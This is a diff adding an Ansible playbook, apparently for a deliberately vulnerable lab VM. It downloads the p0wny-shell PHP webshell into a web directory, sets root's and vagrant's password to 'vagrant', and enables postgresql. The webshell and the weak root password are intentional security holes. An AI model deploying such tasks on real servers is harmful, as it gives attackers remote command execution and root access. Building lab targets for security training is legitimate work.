@@ -1,0 +1,26 @@
+---
+- name: Provision VM with apache and webshell
+  become: true  # If you need to run tasks with elevated privileges, such as sudo
+  hosts: all
+  gather_facts: true
+
+  tasks:
+    - name: Install php webshell
+      ansible.builtin.get_url:
+        url: https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+        dest: "/var/www/html/website"
+        mode: '0644'
+    - name: Set username and password
+      ansible.builtin.user:
+        name: "{{ item }}"
+        password: "{{ 'vagrant' | password_hash('sha512') }}"
+      loop:
+        - "root"
+        - "vagrant"
+    - name: Enable postgresql
+      ansible.builtin.systemd_service:
+        name: "{{ item }}"
+        state: started
+        enabled: true
+      loop:
+        - postgresql
